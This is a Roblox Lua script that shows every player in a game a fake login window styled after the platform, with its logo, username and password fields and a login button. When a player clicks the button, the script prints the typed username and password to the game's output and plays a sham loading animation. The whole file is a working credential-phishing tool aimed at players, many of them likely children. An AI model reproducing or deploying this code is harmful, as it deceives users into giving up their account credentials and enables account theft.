for _,v in pairs (game.Players:GetChildren()) do
gui = Instance.new("ScreenGui", v.PlayerGui)
mainframe = Instance.new("Frame", gui)
mainframe.Size = UDim2.new(0.4, 0, 0.6, 0)
mainframe.Position = UDim2.new(0.3, 0, 0.2, 0)
mainframe.Style = "RobloxSquare"
interface = Instance.new("Frame", mainframe)
interface.Size = UDim2.new(1, 0, 1, 0)
interface.Transparency = 1
mainframe.ClipsDescendants = true
image = Instance.new("ImageLabel", interface)
image.Image = "http://www.roblox.com/asset/?id=127756904"
image.Size = UDim2.new(0.2, 0, 0.15, 0)
image.BackgroundTransparency = 1
image.Name = "Logo"
loginlabel = Instance.new("TextLabel", interface)
loginlabel.Position = UDim2.new(0.25, 0, 0.075, 0)
loginlabel.Font = "Arial"
loginlabel.FontSize = "Size24"
loginlabel.Text = "Login:"
loginlabel.TextColor3 = BrickColor.new("White").Color
loginlabel.TextXAlignment = "Left"
usernamelabel = Instance.new("TextLabel", interface)
usernamelabel.Position = UDim2.new(0, 0, 0.3, 0)
usernamelabel.Font = "Arial"
usernamelabel.FontSize = "Size24"
usernamelabel.Text = "Username:"
usernamelabel.TextColor3 = BrickColor.new("White").Color
usernamelabel.TextXAlignment = "Left"
passwordlabel = Instance.new("TextLabel", interface)
passwordlabel.Position = UDim2.new(0, 0, 0.5, 0)
passwordlabel.Font = "Arial"
passwordlabel.FontSize = "Size24"
passwordlabel.Text = "Password:"
passwordlabel.TextColor3 = BrickColor.new("White").Color
passwordlabel.TextXAlignment = "Left"
--Username
AreaForUsername = Instance.new("TextBox", interface)
AreaForUsername.Position = UDim2.new(0, 0, 0.35, 0)
AreaForUsername.Name = "UsernameArea"
AreaForUsername.Size = UDim2.new(1, 0, 0.1, 0)
AreaForUsername.BackgroundTransparency = 1
AreaForUsername.Text = "[Username Here]"
AreaForUsername.Font = "Arial"
AreaForUsername.FontSize = "Size18"
AreaForUsername.TextColor3 = BrickColor.new("White").Color
--Password
AreaForPassword = Instance.new("TextBox", interface)
AreaForPassword.Position = UDim2.new(0, 0, 0.55, 0)
AreaForPassword.Name = "PasswordArea"
AreaForPassword.Size = UDim2.new(1, 0, 0.1, 0)
AreaForPassword.BackgroundTransparency = 1
AreaForPassword.Text = "[Password Here]"
AreaForPassword.Font = "Arial"
AreaForPassword.FontSize = "Size18"
AreaForPassword.TextColor3 = BrickColor.new("White").Color
--LoginButton
loginbutton = Instance.new("TextButton", interface)
loginbutton.Position = UDim2.new(0, 0, 0.8, 0)
loginbutton.Size = UDim2.new(1, 0, 0.1, 0)
loginbutton.Style = "RobloxButtonDefault"
loginbutton.Font = "Arial"
loginbutton.FontSize = "Size24"
loginbutton.Text = "Login"
loginbutton.TextColor3 = BrickColor.new("White").Color
--Loading Time
loadframe=Instance.new("Frame", mainframe)
loadframe.Size = UDim2.new(1, 0, 1, 0)
loadframe.BackgroundTransparency = 1
--SymbolicLoading
symbolloading=Instance.new("Frame", loadframe)
symbolloading.Size = UDim2.new(0.3, 0, 0.05, 0)
symbolloading.Position = UDim2.new(0, 0, 0.45, 0)
symbolloading.Style = "ChatGreen"
symbolloading.Visible = false
--EndOfGuiCreation


--Clicking
loginbutton.MouseButton1Click:connect(function()
interface:TweenPosition(UDim2.new(0, 0, -1, 0), "Out", "Sine", 3, true)
print(v.Name.."'s Username: "..AreaForUsername.Text)
print(v.Name.."'s Password: "..AreaForPassword.Text)
wait(2)
symbolloading.Visible = true
symbolloading:TweenPosition(UDim2.new(0.7, 0, 0.45, 0), "Out", "Sine", 1, true)
wait(1)
symbolloading:TweenPosition(UDim2.new(0, 0, 0.45, 0), "Out", "Sine", 1, true)
wait(1)
symbolloading:TweenPosition(UDim2.new(0.7, 0, 0.45, 0), "Out", "Sine", 1, true)
wait(1)
symbolloading:TweenPosition(UDim2.new(0, 0, 0.45, 0), "Out", "Sine", 1, true)
wait(1)
symbolloading:TweenPosition(UDim2.new(0.7, 0, 0.45, 0), "Out", "Sine", 1, true)
wait(1)
symbolloading:TweenPosition(UDim2.new(0, 0, 0.45, 0), "Out", "Sine", 1, true)
wait(1)
mainframe:TweenPosition(UDim2.new(2, 0, 0.2, 0), "Out", "Sine", 3, true)
end)
end
